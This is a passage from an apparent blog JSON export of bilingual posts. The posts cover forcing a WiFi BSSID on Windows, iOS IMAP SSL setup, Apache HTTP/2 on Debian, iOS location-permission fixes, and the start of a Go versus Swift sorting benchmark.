ABC 的 WiFi 網路時，範圍內有 3 個 WiFi 路由器。預設情況下，使用訊號最強的 WiFi 路由器，因為它可以提供最佳的連線和傳輸速度。然而，在這種情況下，訊號最強的路由器沒有正確配置。我們如何強制筆記型電腦連接到正常運作的路由器，即使訊號較弱？假設我們想連接到 BSSID 為 xx:xx:xx:xx:xx:xx 的路由器。 強制使用 BSSID 連接 在 Windows 中，我們可以進入控制台並管理你的 WiFi 設定。右鍵點擊你想連接的 WiFi 網路，然後選擇內容。 在無線網路內容中，勾選_啟用 Intel 連線設定_，然後點擊設定。 選擇_強制存取點_，輸入你想連接的 BSSID。點擊確定以儲存設定。 由於訊號強度差導致連線不佳，速度可能會較慢，但至少你可以生存下來，直到有人修復問題。 上述選項僅適用於 Intel WiFi 介面卡。我不知道其他 WiFi 驅動程式是否提供強制 BSSID 的功能。如果你在其他 WiFi 驅動程式中找到它，請告訴我。","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"Wifi","slug":"Wifi","permalink":"https://neo01.com/tags/Wifi/"}],"lang":"zh-TW"},{"title":"Corporate Network Survival Guide - How to Connect with Another WiFi Router with the Same SSID","slug":"2016/11/corporate-network-survival-guide-how-to-connect-with-another-wifi-router-with-the-same-ssid","date":"un00fin00","updated":"un00fin00","comments":true,"path":"2016/11/corporate-network-survival-guide-how-to-connect-with-another-wifi-router-with-the-same-ssid/","permalink":"https://neo01.com/2016/11/corporate-network-survival-guide-how-to-connect-with-another-wifi-router-with-the-same-ssid/","excerpt":"Full signal but no internet? Force connection to specific BSSID to bypass faulty office WiFi routers.","text":"If you find your notebook has WiFi connectivity in a certain area but loses it in some areas with full WiFi signal, you may be under a faulty WiFi router. There are many routers in an office that share the same SSID so that your notebook determines the best WiFi router to connect with. However, some may fail over time. The steps below may help if you connect to a faulty WiFi router nearby that allows you to connect but does not have proper Internet connectivity. First, use the command below to check which WiFi router you are connecting to: $ netsh wlan show interface Take a look at the BSSID under SSID. SSID is an ID that could represent more than one WiFi router, but BSSID is the unique ID for a specific WiFi router: There is 1 interface on the system: Name : Wireless Network Connection Description : Intel(R) Centrino(R) Advanced-N 6205 GUID : d827d652-b7f5-412e-xxxx-1235ea895d99 Physical address : aa:aa:aa:aa:aa:aa State : connected SSID : ABC BSSID : zz:zz:zz:zz:zz:zz Network type : Infrastructure Radio type : 802.11n Authentication : WPA2-Personal Cipher : CCMP Connection mode : Auto Connect Channel : 1 Receive rate (Mbps) : 144 Transmit rate (Mbps) : 144 Signal : 99% Profile : ABC Hosted network status : Not started The notebook is connected to the WiFi network ABC via router zz:zz:zz:zz:zz:zz. Are any other routers available under the SSID ABC? $ netsh wlan show all Look for SHOW NETWORK MODE=BSSID from the result. It shows all the routers available for WiFi network ABC: ======================================================================= ======================= SHOW NETWORKS MODE=BSSID ====================== ======================================================================= SSID 8 : ABC Network type : Infrastructure Authentication : WPA2-Personal Encryption : CCMP BSSID 1 : xx:xx:xx:xx:xx:xx Signal : 80% Radio type : 802.11n Channel : 40 Basic rates (Mbps) : 6 12 24 Other rates (Mbps) : 9 18 36 48 54 BSSID 2 : yy:yy:yy:yy:yy:yy Signal : 76% Radio type : 802.11n Channel : 161 Basic rates (Mbps) : 6 12 24 Other rates (Mbps) : 9 18 36 48 54 BSSID 3 : zz:zz:zz:zz:zz:zz Signal : 99% Radio type : 802.11n Channel : 11 Basic rates (Mbps) : 6.5 16 19.5 117 Other rates (Mbps) : 18 19.5 24 36 39 48 54 156 There are 3 BSSIDs under SSID ABC, which means there are 3 WiFi routers in range when you are trying to connect to the WiFi network named ABC. The WiFi router with the strongest signal to your notebook is used by default, as it can provide the best connectivity and transfer speed. However, the router with the strongest signal is not configured properly in this case. How do we force the notebook to connect to a router that is working although the signal is weaker? Let’s say we want to connect to the router with BSSID xx:xx:xx:xx:xx:xx. Forcing Connection with BSSID In Windows, we can go to the Control Panel and manage your WiFi settings. Right-click on the WiFi network that you want to connect with, and then select Properties. In the Wireless Network Properties, check Enable Intel connection settings, then click Configure. Select Mandatory Access Point, key in the BSSID that you want to connect with. Click OK to save the settings. It may be slower as you have poor connectivity due to poor signal strength, but you survive at least until someone fixes the issue. The above option only works for Intel WiFi adapters. I do not know if other WiFi drivers provide the feature for enforcing BSSID. Let me know if you have found it in another WiFi driver.","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"Wifi","slug":"Wifi","permalink":"https://neo01.com/tags/Wifi/"}]},{"title":"Setup IMAP with SSL-only on iPhone/iPad","slug":"2016/06/setup-imap-with-ssl-only-on-iphoneipad","date":"un33fin33","updated":"un00fin00","comments":true,"path":"2016/06/setup-imap-with-ssl-only-on-iphoneipad/","permalink":"https://neo01.com/2016/06/setup-imap-with-ssl-only-on-iphoneipad/","excerpt":"Can't connect to IMAP SSL on iOS? Airplane mode is the key! Step-by-step visual guide.","text":"You cannot setup IMAP on iPhone/iPad (iOS devices) with a server that only provides IMAP SSL (port 993). iOS detects the existence of IMAP by using non-SSL IMAP port, which is port 143. Here is the trick that helps you to set it up. First, and most important, you have to disable any possible Internet connection. The easiest way is to switch to airplane mode. Go to Settings, tap on Mail, Contacts, Calendars Tap on Add Account Tap on Other Enter basic information and tap Next It would ask for you incoming and outgoing mail server. Fill in the server information. Tap Next. It prompts for network connectivity. Tap OK to ignore it. Tap Next again. This time you can Save. Save again. Tap on the newly created account. Tap on Advanced. Enable Use SSL. Tap Account on top left to save changes and back to previous screen. Remember to switch back to normal mode from airplane mode before testing your email settings.","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}]},{"title":"在 iPhone/iPad 上设置仅使用 SSL 的 IMAP","slug":"2016/06/setup-imap-with-ssl-only-on-iphoneipad-zh-CN","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-CN/2016/06/setup-imap-with-ssl-only-on-iphoneipad/","permalink":"https://neo01.com/zh-CN/2016/06/setup-imap-with-ssl-only-on-iphoneipad/","excerpt":"iOS 无法连接 IMAP SSL？飞行模式是关键！分步骤图解教程","text":"你无法在 iPhone/iPad（iOS 设备）上设置仅提供 IMAP SSL（端口 993）的服务器。iOS 使用非 SSL IMAP 端口（端口 143）来检测 IMAP 的存在。以下是帮助你设置的技巧。 首先，也是最重要的，你必须禁用任何可能的互联网连接。最简单的方法是切换到飞行模式。 前往设置，点击邮件、通讯录、日历 点击添加账户 点击其他 输入基本信息并点击下一步 它会要求你输入收件和发件邮件服务器。填写服务器信息。点击下一步。 它会提示网络连接。点击确定以忽略它。 再次点击下一步。这次你可以保存。 再次保存。 点击新创建的账户。 点击高级。 启用使用 SSL。 点击左上角的账户以保存更改并返回上一个屏幕。 记得在测试你的电子邮件设置之前，从飞行模式切换回正常模式。","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}],"lang":"zh-CN"},{"title":"在 iPhone/iPad 上設定僅使用 SSL 的 IMAP","slug":"2016/06/setup-imap-with-ssl-only-on-iphoneipad-zh-TW","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-TW/2016/06/setup-imap-with-ssl-only-on-iphoneipad/","permalink":"https://neo01.com/zh-TW/2016/06/setup-imap-with-ssl-only-on-iphoneipad/","excerpt":"iOS 無法連接 IMAP SSL？飛航模式是關鍵！分步驟圖解教學","text":"你無法在 iPhone/iPad（iOS 裝置）上設定僅提供 IMAP SSL（連接埠 993）的伺服器。iOS 使用非 SSL IMAP 連接埠（連接埠 143）來偵測 IMAP 的存在。以下是幫助你設定的技巧。 首先，也是最重要的，你必須停用任何可能的網際網路連線。最簡單的方法是切換到飛航模式。 前往設定，點擊郵件、聯絡資訊、行事曆 點擊加入帳號 點擊其他 輸入基本資訊並點擊下一步 它會要求你輸入收件和寄件郵件伺服器。填寫伺服器資訊。點擊下一步。 它會提示網路連線。點擊確定以忽略它。 再次點擊下一步。這次你可以儲存。 再次儲存。 點擊新建立的帳號。 點擊進階。 啟用使用 SSL。 點擊左上角的帳號以儲存變更並返回上一個畫面。 記得在測試你的電子郵件設定之前，從飛航模式切換回正常模式。","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}],"lang":"zh-TW"},{"title":"Setting up HTTP/2 with Apache and PHP on Debian 8","slug":"2016/03/http2-apache-php-debian-8","date":"un22fin22","updated":"un66fin66","comments":true,"path":"2016/03/http2-apache-php-debian-8/","permalink":"https://neo01.com/2016/03/http2-apache-php-debian-8/","excerpt":"Say goodbye to gray waiting time! HTTP/2 multiplexing doubles page load speed with single connection.","text":"My blog has been migrated to a new Debian Virtual Private Server (VPS). I was trying to enable SPDY on my new server, but support from Google for Apache is somewhat broken. The latest Chrome browser supports SPDY 3.1 only, but Google only provides SPDY 3.0 to the Apache module. I decided to skip SPDY and set up HTTP/2, as more major browsers are adopting HTTP/2. HTTP/1.1 makes multiple new connections Before HTTP/2, let’s have a brief idea of how slow HTTP/1.1 is, As you can see from the above chart, 21 new connections are trying to connect to the HTTP server simultaneously after the first request. The gray line in timelines represents time wasted on connecting to the server. My poor server can only serve 5 (first 3, 7th, and 8th) immediately. Overall, the client has to wait for 0.5-1s to start downloading content and reach the red goal line, which means the page is ready for rendering. HTTP/2 multiplexes from the original connection Below is HTTP/2. No more gray! This is because HTTP/2 keeps one single connection (multiplexing) and no time is wasted on handshaking connections. There are many more benefits from HTTP/2. Feel free to explore! Setup To set up HTTP/2 on Apache with PHP5 on Debian 8, I have to use Apache 2.4.18 from the testing channel as this version includes mod_http2. Meanwhile, mod_fcgid is used, but no NPN is required. Lastly, SSL is required for HTTP/2. Create /etc/apt/sources.list.d/testing.list deb http:&#x2F;&#x2F;mirror.steadfast.net&#x2F;debian&#x2F; testing main contrib non-free deb-src http:&#x2F;&#x2F;mirror.steadfast.net&#x2F;debian&#x2F; testing main contrib non-free deb http:&#x2F;&#x2F;ftp.us.debian.org&#x2F;debian&#x2F; testing main contrib non-free deb-src http:&#x2F;&#x2F;ftp.us.debian.org&#x2F;debian&#x2F; testing main contrib non-free Create /etc/apt/preferences.d/testing.pref Package: * Pin: release a&#x3D;testing Pin-Priority: 750 Add below to site config file &lt;Location &#x2F;&gt; AddHandler fcgid-script .php Options +ExecCGI FcgidWrapper &#x2F;usr&#x2F;bin&#x2F;php-cgi .php &lt;&#x2F;Location&gt; Run below commands # install Apache 2.4.18 from testing channel instead of 2.4.10 from stable sudo apt-get install apache2&#x2F;testing apache2-data&#x2F;testing apache2-bin&#x2F;testing libnghttp2-14 libssl1.0.2 apache2-mpm-worker&#x2F;testing # fcgid sudo apt-get libapache2-mod-fcgid # PHP from testing channel sudo apt-get install php-getid3&#x2F;testing php-common&#x2F;testing libphp-phpmailer&#x2F;testing sudo a2enmod mpm_prefork sudo a2enmod fcgid sudo a2dismod php5 # finally, restart apache sudo apache2ctl restart Showing active HTTP/2 session Open chrome://net-internals/#events&amp;q=type:HTTP2_SESSION%20is:active from Chrome. You should see your site listed as in the below screenshot if you have set it up successfully, There are many tutorials about setting up SPDY that would suggest choosing SPDY from the dropdown. SPDY has been removed from the recent version of Chrome. About the new VPS I have been using Openshift.com for free for years. However, I have to switch to another service from Openshift because the free account doesn’t support CA-signed SSL. Paid users can add CA-signed SSL to their website. I do not mind paying, but they do not accept payment from Hong Kong. SSL is getting more important in search engine ranking, and it is required for an advanced protocol such as SPDY that can improve page loading performance. I chose a VPS from hostmada.com for USD 24 a year in the end. Enjoy!","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[]},{"title":"在 Debian 8 上使用 Apache 和 PHP 设置 HTTP/2","slug":"2016/03/http2-apache-php-debian-8-zh-CN","date":"un22fin22","updated":"un66fin66","comments":true,"path":"/zh-CN/2016/03/http2-apache-php-debian-8/","permalink":"https://neo01.com/zh-CN/2016/03/http2-apache-php-debian-8/","excerpt":"告别灰色等待时间！HTTP/2 多路复用让页面加载速度提升 2 倍","text":"我的博客已迁移到新的 Debian 虚拟私人服务器（VPS）。我尝试在新服务器上启用 SPDY，但 Google 对 Apache 的支持有些问题。最新的 Chrome 浏览器仅支持 SPDY 3.1，但 Google 仅为 Apache 模块提供 SPDY 3.0。我决定跳过 SPDY 并设置 HTTP/2，因为更多主要浏览器正在采用 HTTP/2。 HTTP/1.1 建立多个新连接 在 HTTP/2 之前，让我们简要了解 HTTP/1.1 有多慢， 从上图可以看出，在第一个请求之后，21 个新连接同时尝试连接到 HTTP 服务器。时间轴中的灰线代表浪费在连接到服务器上的时间。我可怜的服务器只能立即服务 5 个（前 3 个、第 7 个和第 8 个）。总体而言，客户端必须等待 0.5-1 秒才能开始下载内容并到达红色目标线，这意味着页面已准备好进行渲染。 HTTP/2 从原始连接进行多路复用 以下是 HTTP/2。不再有灰色！这是因为 HTTP/2 保持一个单一连接（多路复用），不会浪费时间在握手连接上。 HTTP/2 还有许多其他好处。随意探索！ 设置 要在 Debian 8 上使用 PHP5 在 Apache 上设置 HTTP/2，我必须使用来自测试频道的 Apache 2.4.18，因为此版本包含 mod_http2。同时，使用 mod_fcgid，但不需要 NPN。最后，HTTP/2 需要 SSL。 创建 /etc/apt/sources.list.d/testing.list deb http:&#x2F;&#x2F;mirror.steadfast.net&#x2F;debian&#x2F; testing main contrib non-free deb-src http:&#x2F;&#x2F;mirror.steadfast.net&#x2F;debian&#x2F; testing main contrib non-free deb http:&#x2F;&#x2F;ftp.us.debian.org&#x2F;debian&#x2F; testing main contrib non-free deb-src http:&#x2F;&#x2F;ftp.us.debian.org&#x2F;debian&#x2F; testing main contrib non-free 创建 /etc/apt/preferences.d/testing.pref Package: * Pin: release a&#x3D;testing Pin-Priority: 750 将以下内容加入网站配置文件 &lt;Location &#x2F;&gt; AddHandler fcgid-script .php Options +ExecCGI FcgidWrapper &#x2F;usr&#x2F;bin&#x2F;php-cgi .php &lt;&#x2F;Location&gt; 运行以下命令 # 从测试频道安装 Apache 2.4.18，而不是从稳定版安装 2.4.10 sudo apt-get install apache2&#x2F;testing apache2-data&#x2F;testing apache2-bin&#x2F;testing libnghttp2-14 libssl1.0.2 apache2-mpm-worker&#x2F;testing # fcgid sudo apt-get libapache2-mod-fcgid # 从测试频道安装 PHP sudo apt-get install php-getid3&#x2F;testing php-common&#x2F;testing libphp-phpmailer&#x2F;testing sudo a2enmod mpm_prefork sudo a2enmod fcgid sudo a2dismod php5 # 最后，重新启动 apache sudo apache2ctl restart 显示活动的 HTTP/2 会话 从 Chrome 打开 chrome://net-internals/#events&amp;q=type:HTTP2_SESSION%20is:active。如果你成功设置，你应该会看到你的网站列在下面的截图中， 有许多关于设置 SPDY 的教程会建议从下拉菜单中选择 SPDY。SPDY 已从最新版本的 Chrome 中移除。 关于新的 VPS 我已经免费使用 Openshift.com 多年。然而，我必须从 Openshift 切换到另一个服务，因为免费账户不支持 CA 签署的 SSL。付费用户可以将 CA 签署的 SSL 加入他们的网站。我不介意付费，但他们不接受来自香港的付款。SSL 在搜索引擎排名中变得越来越重要，并且对于像 SPDY 这样可以改善页面加载性能的高级协议是必需的。我最终从 hostmada.com 选择了一个 VPS，每年 24 美元。 享受吧！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[],"lang":"zh-CN"},{"title":"在 Debian 8 上使用 Apache 和 PHP 設定 HTTP/2","slug":"2016/03/http2-apache-php-debian-8-zh-TW","date":"un22fin22","updated":"un66fin66","comments":true,"path":"/zh-TW/2016/03/http2-apache-php-debian-8/","permalink":"https://neo01.com/zh-TW/2016/03/http2-apache-php-debian-8/","excerpt":"告別灰色等待時間！HTTP/2 多工處理讓頁面載入速度提升 2 倍","text":"我的部落格已遷移到新的 Debian 虛擬私人伺服器（VPS）。我嘗試在新伺服器上啟用 SPDY，但 Google 對 Apache 的支援有些問題。最新的 Chrome 瀏覽器僅支援 SPDY 3.1，但 Google 僅為 Apache 模組提供 SPDY 3.0。我決定跳過 SPDY 並設定 HTTP/2，因為更多主要瀏覽器正在採用 HTTP/2。 HTTP/1.1 建立多個新連線 在 HTTP/2 之前，讓我們簡要了解 HTTP/1.1 有多慢， 從上圖可以看出，在第一個請求之後，21 個新連線同時嘗試連接到 HTTP 伺服器。時間軸中的灰線代表浪費在連接到伺服器上的時間。我可憐的伺服器只能立即服務 5 個（前 3 個、第 7 個和第 8 個）。總體而言，客戶端必須等待 0.5-1 秒才能開始下載內容並到達紅色目標線，這意味著頁面已準備好進行渲染。 HTTP/2 從原始連線進行多工處理 以下是 HTTP/2。不再有灰色！這是因為 HTTP/2 保持一個單一連線（多工處理），不會浪費時間在握手連線上。 HTTP/2 還有許多其他好處。隨意探索！ 設定 要在 Debian 8 上使用 PHP5 在 Apache 上設定 HTTP/2，我必須使用來自測試頻道的 Apache 2.4.18，因為此版本包含 mod_http2。同時，使用 mod_fcgid，但不需要 NPN。最後，HTTP/2 需要 SSL。 建立 /etc/apt/sources.list.d/testing.list deb http:&#x2F;&#x2F;mirror.steadfast.net&#x2F;debian&#x2F; testing main contrib non-free deb-src http:&#x2F;&#x2F;mirror.steadfast.net&#x2F;debian&#x2F; testing main contrib non-free deb http:&#x2F;&#x2F;ftp.us.debian.org&#x2F;debian&#x2F; testing main contrib non-free deb-src http:&#x2F;&#x2F;ftp.us.debian.org&#x2F;debian&#x2F; testing main contrib non-free 建立 /etc/apt/preferences.d/testing.pref Package: * Pin: release a&#x3D;testing Pin-Priority: 750 將以下內容加入網站配置檔案 &lt;Location &#x2F;&gt; AddHandler fcgid-script .php Options +ExecCGI FcgidWrapper &#x2F;usr&#x2F;bin&#x2F;php-cgi .php &lt;&#x2F;Location&gt; 執行以下命令 # 從測試頻道安裝 Apache 2.4.18，而不是從穩定版安裝 2.4.10 sudo apt-get install apache2&#x2F;testing apache2-data&#x2F;testing apache2-bin&#x2F;testing libnghttp2-14 libssl1.0.2 apache2-mpm-worker&#x2F;testing # fcgid sudo apt-get libapache2-mod-fcgid # 從測試頻道安裝 PHP sudo apt-get install php-getid3&#x2F;testing php-common&#x2F;testing libphp-phpmailer&#x2F;testing sudo a2enmod mpm_prefork sudo a2enmod fcgid sudo a2dismod php5 # 最後，重新啟動 apache sudo apache2ctl restart 顯示活動的 HTTP/2 會話 從 Chrome 開啟 chrome://net-internals/#events&amp;q=type:HTTP2_SESSION%20is:active。如果你成功設定，你應該會看到你的網站列在下面的截圖中， 有許多關於設定 SPDY 的教學會建議從下拉選單中選擇 SPDY。SPDY 已從最新版本的 Chrome 中移除。 關於新的 VPS 我已經免費使用 Openshift.com 多年。然而，我必須從 Openshift 切換到另一個服務，因為免費帳戶不支援 CA 簽署的 SSL。付費使用者可以將 CA 簽署的 SSL 加入他們的網站。我不介意付費，但他們不接受來自香港的付款。SSL 在搜尋引擎排名中變得越來越重要，並且對於像 SPDY 這樣可以改善頁面載入效能的進階協定是必需的。我最終從 hostmada.com 選擇了一個 VPS，每年 24 美元。 享受吧！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[],"lang":"zh-TW"},{"title":"CLLocationManager 教程与疑难排解","slug":"2016/02/cllocationmanager-tutorial-and-troubleshooting-zh-CN","date":"un00fin00","updated":"un66fin66","comments":true,"path":"/zh-CN/2016/02/cllocationmanager-tutorial-and-troubleshooting/","permalink":"https://neo01.com/zh-CN/2016/02/cllocationmanager-tutorial-and-troubleshooting/","excerpt":"iOS 8 后位置服务不工作？解决 CLLocationManager 常见问题的完整指南","text":"许多开发者抱怨移动应用程序开发比网页应用程序开发更困难。他们尝试精确地遵循在线教程，但移动应用程序仍然无法运作。这是因为移动平台发展迅速，教程无法保持最新。 我的朋友遇到了上述情况，无法从位置管理器获得任何位置更新。他将 CoreLocation.framework 库加入到 Link Binary， 然后，他放入以下代码，看起来是对的。 然而，控制台没有任何输出。这是因为从 iOS 8 开始，你需要加入 NSLocationAlwaysUsageDescription 或 NSLocationWhenInUseUsageDescription，取决于 requestAlwaysAuthorization（用于后台位置）或 requestWhenInUseAuthorization（仅在前台时的位置）。 让我们开始构建并运行应用程序。如果你第一次启动它，你应该会看到以下警告。 点击允许后，你应该会获得更新。如果你在模拟器上运行，你可能需要通过从 Debug -&gt; Location 选择位置来调整位置。 我已将项目上传到 https://github.com/neoalienson/CLLocationManagerSample 祝你好运，我希望这个教程不会很快过时！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"}],"lang":"zh-CN"},{"title":"CLLocationManager Tutorial and Troubleshooting","slug":"2016/02/cllocationmanager-tutorial-and-troubleshooting","date":"un00fin00","updated":"un66fin66","comments":true,"path":"2016/02/cllocationmanager-tutorial-and-troubleshooting/","permalink":"https://neo01.com/2016/02/cllocationmanager-tutorial-and-troubleshooting/","excerpt":"Location services not working after iOS 8? Complete guide to fixing common CLLocationManager issues with NSLocationUsageDescription.","text":"Many developers complain that mobile application development is more difficult than web application development. They try to follow tutorials online precisely, but the mobile application still doesn’t work. This is because mobile platforms evolve rapidly, and tutorials just can’t keep up to date. My friend had the above situation and failed to get any location update from the location manager. He added the CoreLocation.framework library to Link Binary, Then, he put the code below, and it seems right. However, nothing comes out to the console. This is because, starting from iOS 8, you need to add NSLocationAlwaysUsageDescription or NSLocationWhenInUseUsageDescription, depending on requestAlwaysAuthorization (for background location) or requestWhenInUseAuthorization (location only when foreground). Let’s start to build and run the app. You should see the alert below if you start it for the first time. You should get an update after tapping Allow. You may need to adjust the location if you are running the Simulator by choosing a location from Debug -&gt; Location. I have uploaded the project to https://github.com/neoalienson/CLLocationManagerSample Good luck, and I hope this tutorial does not become outdated very soon!","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"}]},{"title":"CLLocationManager 教學與疑難排解","slug":"2016/02/cllocationmanager-tutorial-and-troubleshooting-zh-TW","date":"un00fin00","updated":"un66fin66","comments":true,"path":"/zh-TW/2016/02/cllocationmanager-tutorial-and-troubleshooting/","permalink":"https://neo01.com/zh-TW/2016/02/cllocationmanager-tutorial-and-troubleshooting/","excerpt":"iOS 8 後位置服務不工作？解決 CLLocationManager 常見問題的完整指南","text":"許多開發者抱怨行動應用程式開發比網頁應用程式開發更困難。他們嘗試精確地遵循線上教學，但行動應用程式仍然無法運作。這是因為行動平台發展迅速，教學無法保持最新。 我的朋友遇到了上述情況，無法從位置管理器獲得任何位置更新。他將 CoreLocation.framework 函式庫加入到 Link Binary， 然後，他放入以下程式碼，看起來是對的。 然而，控制台沒有任何輸出。這是因為從 iOS 8 開始，你需要加入 NSLocationAlwaysUsageDescription 或 NSLocationWhenInUseUsageDescription，取決於 requestAlwaysAuthorization（用於背景位置）或 requestWhenInUseAuthorization（僅在前景時的位置）。 讓我們開始建構並執行應用程式。如果你第一次啟動它，你應該會看到以下警告。 點擊允許後，你應該會獲得更新。如果你在模擬器上執行，你可能需要透過從 Debug -&gt; Location 選擇位置來調整位置。 我已將專案上傳到 https://github.com/neoalienson/CLLocationManagerSample 祝你好運，我希望這個教學不會很快過時！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"}],"lang":"zh-TW"},{"title":"C、Go、Java、Javascript、PHP、Python 和 Swift 的趣味基準測試","slug":"2015/12/go-vs-swift-a-simple-benchmark-test-zh-TW","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-TW/2015/12/go-vs-swift-a-simple-benchmark-test/","permalink":"https://neo01.com/zh-TW/2015/12/go-vs-swift-a-simple-benchmark-test/","excerpt":"Java 竟然贏了？7 種語言氣泡排序效能對決，結果出人意料","text":"故事從 Swift 和 Go 開始 我更喜歡 Apple 的 Swift 語言的美感，勝過 Google 的 Go。好吧，這是主觀的。Apple 已將 Swift 開源，我決定運行一個簡單的基準測試，以客觀地了解哪種語言在速度方面更好。 Go 的氣泡排序， package main import &quot;testing&quot; func BenchmarkBubbleSort(b *testing.B) &#123; array :&#x3D; [...]int&#123;83,86,77,15,93,35,86,92,49,21,62,27,90,59,63,26,40,26,72,36,11,68,67,29,82,30,62,23,67,35,29,2,22,58,69,67,93,56,11,42,29,73,21,19,84,37,98,24,15,70,13,26,91,80,56,73,62,70,96,81,5,25,84,27,36,5,46,29,13,57,24,95,82,45,14,67,34,64,43,50,87,8,76,78,88,84,3,51,54,99,32,60,76,68,39,12,26,86,94,39,95,70,34,78,67,1,97,2,17,92,52,56,1,80,86,41,65,89,44,19,40,29,31,17,97,71,81,75,9,27,67,56,97,53,86,65,6,83,19,24,28,71,32,29,3,19,70,68,8,15,40,49,96,23,18,45,46,51,21,55,79,88,64,28,41,50,93,0,34,64,24,14,87,56,43,91,27,65,59,36,32,51,37,28,75,7,74,21,58,95,29,37,35,93,18,28,43,11,28,29,76,4,43,63,13,38,6,40,4,18,28,88,69,17,17,96,24,43,70,83,90,99,72,25,44,90,5,39,54,86,69,82,42,64,97,7,55,4,48,11,22,28,99,43,46,68,40,22,11,10,5,1,61,30,78,5,20,36,44,26,22,65,8,16,82,58,24,37,62,24,0,36,52,99,79,50,68,71,73,31,81,30,33,94,60,63,99,81,99,96,59,73,13,68,90,95,26,66,84,40,90,84,76,42,36,7,45,56,79,18,87,12,48,72,59,9,36,10,42,87,6,1,13,72,21,55,19,99,21,4,39,11,40,67,5,28,27,50,84,58,20,24,22,69,96,81,30,84,92,72,72,50,25,85,22,99,40,42,98,13,98,90,24,90,9,81,19,36,32,55,94,4,79,69,73,76,50,55,60,42,79,84,93,5,21,67,4,13,61,54,26,59,44,2,2,6,84,21,42,68,28,89,72,8,58,98,36,8,53,48,3,33,33,48,90,54,67,46,68,29,0,46,88,97,49,90,3,33,63,97,53,92,86,25,52,96,75,88,57,29,36,60,14,21,60,4,28,27,50,48,56,2,94,97,99,43,39,2,28,3,0,81,47,38,59,51,35,34,39,92,15,27,4,29,49,64,85,29,43,35,77,0,38,71,49,89,67,88,92,95,43,44,29,90,82,40,41,69,26,32,61,42,60,17,23,61,81,9,90,25,96,67,77,34,90,26,24,57,14,68,5,58,12,86,0,46,26,94,16,52,78,29,46,90,47,70,51,80,31,93,57,27,12,86,14,55,12,90,12,79,10,69,89,74,55,41,20,33,87,88,38,66,70,84,56,17,6,60,49,37,5,59,17,18,45,83,73,58,73,37,89,83,7,78,57,14,71,29,0,59,18,38,25,88,74,33,57,81,93,58,70,99,17,39,69,63,22,94,73,47,31,62,82,90,92,91,57,15,21,57,74,91,47,51,31,21,37,40,54,30,98,25,81,16,16,2,31,39,96,4,38,80,18,21,70,62,12,79,77,85,36,4,76,83,7,59,57,44,99,11,27,50,36,60,18,5,63,49,44,11,5,34,91,75,55,14,89,68,93,18,5,82,22,82,17,30,93,74,26,93,86,53,43,74,14,13,79,77,62,75,88,19,10,32,94,17,46,35,37,91,53,43,73,28,25,91,10,18,17,36,63,55,90,58,30,4,71,61,33,85,89,73,4,51,5,50,68,3,85,6,95,39,49,20,67,26,63,77,96,81,65,60,36,55,70,18,11,42,32,96,79,21,70,84,72,27,34,40,83,72,98,30,63,47,50,30,73,14,59,22,47,24,82,35,32,4,54,43,98,86,40,78,59,62,62,83,41,48,23,24,72,22,54,35,21,57,65,47,71,76,69,18,1,3,53,33,7,59,28,6,97,20,84,8,34,98,91,76,98,15,52,71,89,59,6,10,16,24,9,39,0,78,9,53,81,14,38,89,26,67,47,23,87,31,32,22,81,75,50,79,90,54,50,31,13,57,94,81,81,3,20,33,82,81,87,15,96,25,4,22,92,51,97,32,34,81,6,15,57,8,95,99,62,97,83,76,54,77,9,87,32,82,21,66,63,60,82,11,85,86,85,30,90,83,14,76,16,20,92,25,28,39,25,90,36,60,18,43,37,28,82,21,10,55,88,25,15,70,37,53,8,22,83,50,57,97,27,26,69,71,51,49,10,28,39,98,88,10,93,77,90,76,99,52,31,87,77,99,57,66,52,17,41,35,68,98,84,95,76,5,66,28,54,28,8,93,78,97,55,72,74,45,0,25,97,83,12,27,82,21&#125; for c :&#x3D; 0; c &lt; 100; c++ &#123; for i :&#x3D; 0; i &lt; len(array); i++ &#123; for y :&#x3D; 0; y &lt; len(array) - 1; y++ &#123; if array[y+1] &lt; array[y] &#123; t :&#x3D; array[y] array[y] &#x3D; array[y+1] array[y+1] &#x3D; t &#125; &#125; &#125; &#125; &#125; Swift 的氣泡排序， func benchmarkBubbleSort() &#123; var array : [Int] &#x3D; 